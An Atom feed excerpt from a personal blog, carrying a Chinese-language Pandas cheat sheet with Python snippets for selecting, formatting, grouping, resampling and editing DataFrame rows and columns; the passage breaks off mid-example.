    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="é¢è¯•" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="git" scheme="https://disda-coding.github.io/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>PandasåŸºç¡€</title>
    <link href="https://disda-coding.github.io/2022/04/13/Pandas/"/>
    <id>https://disda-coding.github.io/2022/04/13/Pandas/</id>
    <published>2022-04-13T07:42:27.000Z</published>
    <updated>2023-03-29T01:03:25.366Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96%E5%A4%84%E7%90%86">æ•°æ®è¯»å–å¤„ç†</a><ul><li><a href="#%E9%80%89%E6%8B%A9%E5%88%97">é€‰æ‹©åˆ—</a></li><li><a href="#%E9%80%89%E6%8B%A9%E8%A1%8C">é€‰æ‹©è¡Œ</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96">æ•°æ®æ ¼å¼åŒ–</a></li><li><a href="#%E6%97%A5%E6%9C%9F">æ—¥æœŸ</a></li><li><a href="#crud">CRUD</a><ul><li><a href="#%E5%88%97%E6%93%8D%E4%BD%9C">åˆ—æ“ä½œ</a></li><li><a href="#%E8%A1%8C%E6%93%8D%E4%BD%9C">è¡Œæ“ä½œ</a></li></ul><ul><li><a href="#create">Create</a></li><li><a href="#del">Del</a></li><li><a href="#update">Update</a></li><li><a href="#retrieve">Retrieve</a></li></ul></li><li><a href="#%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6">ä¿å­˜æ–‡ä»¶</a></li><li><a href="#tricks">Tricks</a></li><li><a href="#matplotlib">matplotlib</a></li><li><a href="#tips">Tips</a><ul><li><a href="#%E5%B1%8F%E8%94%BD%E6%8F%90%E9%86%92">å±è”½æé†’</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87">æ˜¾ç¤ºä¸­æ–‡</a></li><li><a href="#%E5%85%B3%E4%BA%8Eiloc%E5%92%8C%E9%80%89%E6%8B%A9%E8%B5%8B%E5%80%BC%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98">å…³äºilocå’Œ[]é€‰æ‹©èµ‹å€¼å¤±è´¥é—®é¢˜</a></li></ul></li></ul><!-- tocstop --><h2><span id="æ•°æ®è¯»å–å¤„ç†">æ•°æ®è¯»å–å¤„ç†</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iris = load_iris()</span><br><span class="line">lable = iris.feature_names</span><br><span class="line">target = iris.target</span><br><span class="line">feature = iris.data</span><br><span class="line">data = np.column_stack((feature,target))</span><br><span class="line">lable.append(<span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">df = pd.DataFrame(data,columns=lable)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">a[:,np.newaxis]</span><br></pre></td></tr></table></figure><h3><span id="é€‰æ‹©åˆ—">é€‰æ‹©åˆ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr.select_dtypes(include=[<span class="string">&#x27;int64&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="é€‰æ‹©è¡Œ">é€‰æ‹©è¡Œ</span></h3><ul><li>å¯ä»¥é€šè¿‡ â€œ.â€  æ¥æ“ä½œ <code>df.a</code></li><li>ä¹Ÿå¯ä»¥é€šè¿‡ â€œ[]â€ æ¥æ“ä½œ <code>df[&#39;a&#39;]</code></li></ul><h2><span id="æ•°æ®æ ¼å¼åŒ–">æ•°æ®æ ¼å¼åŒ–</span></h2><ol><li>mapã€applyåœ¨ç”¨äºSeriesæ—¶ï¼Œå¯¹æ¯ä¸€ä¸ªå€¼è¿›è¡Œå¤„ç†ï¼Œä¸¤è€…å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«</li><li>applyä¸ä»…å¯ä»¥ç”¨äºSeriesï¼Œè¿˜å¯ä»¥ç”¨äºDataFrameï¼›è€Œmapåªèƒ½ç”¨äºSeriesã€‚</li><li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œapplyåº”ç”¨æ›´å¹¿æ³›ï¼Œå°¤å…¶æ˜¯è‡ªå®šä¹‰å‡½æ•°å¸¦å¤šä¸ªå‚æ•°æ—¶ï¼Œå»ºè®®ä½¿ç”¨applyã€‚</li><li>applymapå¯ä»¥å¯¹å¤šä¸ªSeriesè¿›è¡Œæ“ä½œï¼Œmapå’Œapplyå‡ä¸è¡Œã€‚</li></ol><ul><li><p><strong>apply &#x2F;map&#x2F;applymap</strong>  å‡½æ•°ï¼ˆå¸¸ç”¨æ–¹æ³•ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cal_interval</span>(<span class="params">df,from_date,to_date</span>):</span><br><span class="line">    delta = <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = datetime.datetime.strptime(df[from_date],<span class="string">&quot;%m/%d/%Y&quot;</span>)</span><br><span class="line">        t = datetime.datetime.strptime(df[to_date],<span class="string">&quot;%m/%d/%Y&quot;</span>)</span><br><span class="line">        delta = (t-f).days</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> delta&lt;=<span class="number">0</span> <span class="keyword">else</span> delta</span><br><span class="line">  df[<span class="string">&#x27;d&#x27;</span>] = df.apply(cal_interval,axis=<span class="number">1</span>,args=[<span class="string">&#x27;Date Event Began&#x27;</span>,<span class="string">&#x27;Date of Restoration&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date = pd.period_range(start = <span class="string">&#x27;1990-02-01&#x27;</span>,periods=<span class="number">100</span>,freq=<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;date&#x27;</span>:date,<span class="string">&#x27;val&#x27;</span>:np.random.randn(<span class="built_in">len</span>(date)),<span class="string">&#x27;val2&#x27;</span>:np.random.randn(<span class="built_in">len</span>(date))&#125;)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="right"></th><th align="right">date</th><th align="right">val</th><th>val2</th></tr></thead><tbody><tr><td align="right">0</td><td align="right">1990-02-01</td><td align="right">0.771114</td><td>0.223646</td></tr><tr><td align="right">1</td><td align="right">1990-02-02</td><td align="right">-0.630781</td><td>-1.231217</td></tr><tr><td align="right">2</td><td align="right">1990-02-03</td><td align="right">-0.435648</td><td>-1.324931</td></tr><tr><td align="right">3</td><td align="right">1990-02-04</td><td align="right">2.459657</td><td>1.195601</td></tr><tr><td align="right">4</td><td align="right">1990-02-05</td><td align="right">0.378009</td><td>2.207286</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># applyé»˜è®¤æ˜¯ä½œç”¨äºåˆ—ï¼Œè¦ä½œç”¨äºè¡Œçš„è¯éœ€è¦åŠ ä¸Šaxis=1</span></span><br><span class="line">q2.apply(<span class="keyword">lambda</span> x:x.åŸä»·==x.å®ä»·,axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ä¿ç•™ä¸¤ä½å°æ•°ï¼ˆç±»å‹å˜æˆObjectï¼‰</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment"># å››èˆäº”å…¥ä¿ç•™ä¸¤ä½å°æ•°</span></span><br><span class="line">df.val.<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬ä¸ºç™¾åˆ†æ¯”ï¼Œå¹¶ä¿ç•™2ä½å°æ•° lambda å†™æ³•</span></span><br><span class="line">df.val.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">q2_df[col].apply(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2%&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­£å¸¸å‡½æ•°å†™æ³•ï¼ˆä¸æ¨èï¼‰</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%.2f%%&#x27;</span> % (x * <span class="number">100</span>);</span><br><span class="line">df.val.apply(turn_percentage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è·å¥–æ—¶é—´æ ¼å¼åŒ–ä¸ºxæœˆxæ—¥</span></span><br><span class="line">df.date.apply(<span class="keyword">lambda</span> x:x.strftime(<span class="string">&#x27;%mæœˆ%dæ—¥&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†Seriesä¸­çš„æ•°æ®å’Œå­—ç¬¦æ‹¼æ¥</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="string">f&#x27;éšæœºæ•°ï¼š <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># applymapå¯ä»¥å¯¹å¤šä¸ªSeriesè¿›è¡Œæ“ä½œ</span></span><br><span class="line">df[[<span class="string">&#x27;val&#x27;</span>,<span class="string">&#x27;val1&#x27;</span>]].applymap(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„å»ºapplyå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_state</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">if</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>] &lt;=<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Off&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>]&gt;<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;On&#x27;</span></span><br><span class="line"><span class="comment"># åº”ç”¨applyå‡½æ•°</span></span><br><span class="line">df_Austin_ev = df.apply(judge_state,axis = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mapä¼ å…¥å­—å…¸ å…¶ä½™å€¼å‡å˜ä¸ºNaN</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]&#125;)</span><br><span class="line">df1.A=df1.A.<span class="built_in">map</span>(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;B&#x27;</span>&#125;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dfä½¿ç”¨applyè¿˜å¯ä»¥ä¼ å…¶ä»–å‚</span></span><br><span class="line"><span class="keyword">import</span> statsmodels.api <span class="keyword">as</span> sm</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">regress</span>(<span class="params">data, yvar, xvars</span>):</span><br><span class="line">    Y = data[yvar]</span><br><span class="line">    X = data[xvars]</span><br><span class="line">    X[<span class="string">&#x27;intercept&#x27;</span>] = <span class="number">1.</span></span><br><span class="line">    result = sm.OLS(Y, X).fit()</span><br><span class="line">    <span class="keyword">return</span> result.params</span><br><span class="line">  </span><br><span class="line">by_year.apply(regress, <span class="string">&#x27;AAPL&#x27;</span>, [<span class="string">&#x27;SPX&#x27;</span>])</span><br></pre></td></tr></table></figure></li><li><p>groupbyåçš„apply</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ•°æ®æ˜¯tg_id,month,q1-q96,æ±‚æ¯ä¸ªæœˆq1-q96ä¸­æœ€å¤§çš„ç‚¹</span></span><br><span class="line"><span class="comment"># æ³•1</span></span><br><span class="line">df.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x))))</span><br><span class="line"><span class="comment"># æ³• 2</span></span><br><span class="line">df.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x,axis=<span class="number">1</span>))).reset_index().groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x)))</span><br><span class="line"><span class="comment"># æ³•3</span></span><br><span class="line">val = [<span class="string">f&#x27;p<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">97</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_min</span>(<span class="params">df</span>):</span><br><span class="line">  <span class="keyword">return</span> df[val].<span class="built_in">min</span>().<span class="built_in">min</span>()</span><br><span class="line">q4.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(cal_max)</span><br><span class="line"><span class="comment"># æ³•4</span></span><br><span class="line">q4.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x[val].<span class="built_in">max</span>().<span class="built_in">max</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>å°†å«æœ‰ç©ºç™½ç¬¦çš„åˆ—è½¬float</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.a.replace(<span class="string">r&#x27;^\s*$&#x27;</span>, np.nan, regex=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ul><h2><span id="æ—¥æœŸ">æ—¥æœŸ</span></h2><ul><li>å°†æ—¥çš„æ•°æ®è½¬ä¸ºä»¥æœˆä¸ºç»Ÿè®¡çš„æ•°æ®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æå–æ—¥æœŸä¸­çš„date</span></span><br><span class="line">df[<span class="string">&#x27;date&#x27;</span>].dt.date</span><br><span class="line"><span class="comment"># é‡é‡‡æ · ç»Ÿè®¡</span></span><br><span class="line">df.resample(<span class="string">&#x27;D&#x27;</span>).count()</span><br><span class="line"><span class="comment">#é‡é‡‡æ · é€ä¸ªæ˜¾ç¤º</span></span><br><span class="line">df.to_period(<span class="string">&quot;M&quot;</span>)</span><br><span class="line"><span class="comment"># å¼‚å½¢æ—¥æœŸè½¬æ¢</span></span><br><span class="line">pd.to_datetime(work_index[<span class="string">&#x27;æ—¥æœŸ&#x27;</span>],<span class="built_in">format</span>=<span class="string">&#x27;%Y%m%d&#x27;</span>)</span><br><span class="line"><span class="comment"># é€‰æ‹©æ—¥æœŸèŒƒå›´</span></span><br><span class="line">bz = [<span class="string">&#x27;2022-2-14&#x27;</span>,<span class="string">&#x27;2022-2-20&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="crud">CRUD</span></h2><p>ä¸€èˆ¬æ¥è¯´pandasæ“ä½œéƒ½ä¸ä¼šåœ¨åŸdataframeè¿›è¡Œä¿®æ”¹ï¼Œé€šè¿‡inplace&#x3D;Trueå¯ä»¥å®ç°å°±åœ°ä¿®æ”¹ã€‚</p><h4><span id="åˆ—æ“ä½œ">åˆ—æ“ä½œ</span></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡å‘½åç‰¹å®šåˆ—å</span></span><br><span class="line">df.rename(columns=&#123;<span class="string">&#x27;A&#x27;</span>:<span class="string">&#x27;a&#x27;</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># é‡å‘½åæ‰€æœ‰åˆ—å</span></span><br><span class="line">df.columns = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="comment"># å–å‡ºç‰¹å®šç±»å‹çš„åˆ—å</span></span><br><span class="line">obj_feature=df.dtypes[df.dtypes==<span class="string">&#x27;object&#x27;</span>].index</span><br><span class="line"><span class="comment"># æ›´æ–°åˆ—çš„ç±»å‹</span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] = df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].astype(<span class="built_in">int</span>)</span><br><span class="line"><span class="comment"># æ’å…¥list</span></span><br><span class="line">df.a = df.a.astype(<span class="string">&#x27;list&#x27;</span>)</span><br><span class="line">df.iat[i,-<span class="number">1</span>] = <span class="built_in">list</span>(xxx)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># è¿æ¥ä¸¤ä¸ªåˆ—</span></span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åªå–ç»“æœçš„äº¤é›†</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>,join=<span class="string">&#x27;inner&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åªå–åŒ…å« df1 ç´¢å¼•çš„éƒ¨åˆ†</span></span><br><span class="line">pd.concat([df1, df4], axis=<span class="number">1</span>).reindex(df1.index)</span><br><span class="line">pd.merge(df1,df4,left_index=<span class="literal">True</span>,right_index=<span class="literal">True</span>,how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°å¢åˆ—</span></span><br><span class="line">df[<span class="string">&#x27;new col name&#x27;</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ’å…¥åˆ—</span></span><br><span class="line">tmp3 = (df[<span class="string">&#x27;æ˜¥èŠ‚æœŸé—´ï¼ˆé™¤å¤•è‡³åˆå…­ï¼‰ç”¨ç”µé‡&#x27;</span>]-df[<span class="string">&#x27;èŠ‚å‰æ¸©åº¦æ¥è¿‘çš„ä¸€å‘¨ç”¨ç”µé‡&#x27;</span>])/df[<span class="string">&#x27;èŠ‚å‰æ¸©åº¦æ¥è¿‘çš„ä¸€å‘¨ç”¨ç”µé‡&#x27;</span>]</span><br><span class="line">tmp1 = df.iloc[:,:<span class="number">1</span>]</span><br><span class="line">tmp2 = df.iloc[:,<span class="number">1</span>:]</span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤ df çš„ 7ã€8ã€9ã€10 åˆ—</span></span><br><span class="line">df.drop(df.columns[[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]], axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># æå–ç¬¬1ï¼Œ2ï¼Œ3ï¼Œ4åˆ—</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="comment"># æå– é‡‘ç‰Œæ•°ã€é“¶ç‰Œæ•°ã€é“œç‰Œæ•° ä¸‰åˆ—</span></span><br><span class="line">df[[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>,<span class="string">&#x27;é“¶ç‰Œæ•°&#x27;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]]</span><br><span class="line"><span class="comment"># æå–å…¨éƒ¨åˆ—åä¸­ä»¥ â€œæ•°â€ ç»“å°¾çš„åˆ—</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;æ•°&#x27;</span>)]</span><br><span class="line"><span class="comment"># æ”¹å˜åˆ—é¡ºåº</span></span><br><span class="line">df = df[[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>]]</span><br><span class="line"><span class="comment"># å•ä¸€ä¸€åˆ—æå‰å¯ä»¥</span></span><br><span class="line">df.set_index(<span class="string">&#x27;a&#x27;</span>).reset_index()</span><br><span class="line"><span class="comment"># æŒ‰åˆ—æ’åº</span></span><br><span class="line">df.<span class="built_in">max</span>(axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">df.<span class="built_in">max</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ç»Ÿè®¡å‡ºç°æœ€å¤šçš„</span></span><br><span class="line">tmp2 =df.groupby([<span class="string">&#x27;genreId&#x27;</span>]).agg(<span class="keyword">lambda</span> x:x.mode())</span><br><span class="line"><span class="comment"># æ–¹æ³•äºŒ</span></span><br><span class="line">df.groupby([<span class="string">&#x27;genreId&#x27;</span>,<span class="string">&#x27;contentRating&#x27;</span>]).count()[[<span class="string">&#x27;id&#x27;</span>]].idxmax(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="è¡Œæ“ä½œ">è¡Œæ“ä½œ</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ‹¼æ¥è¡Œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å«æœ‰ç©ºå€¼çš„è¡Œ</span></span><br><span class="line">df[df.isna().T.<span class="built_in">any</span>()]</span><br><span class="line"><span class="comment"># è¿æ¥ä¸¤ä¸ªdf</span></span><br><span class="line">pd.concat([train,val],ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df = pd.concat([train,val]).reset_index()</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">train.append(val).reset_index()</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">train.append(val,ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ® key è¿æ¥ left å’Œ right</span></span><br><span class="line">pd.merge(left, right, 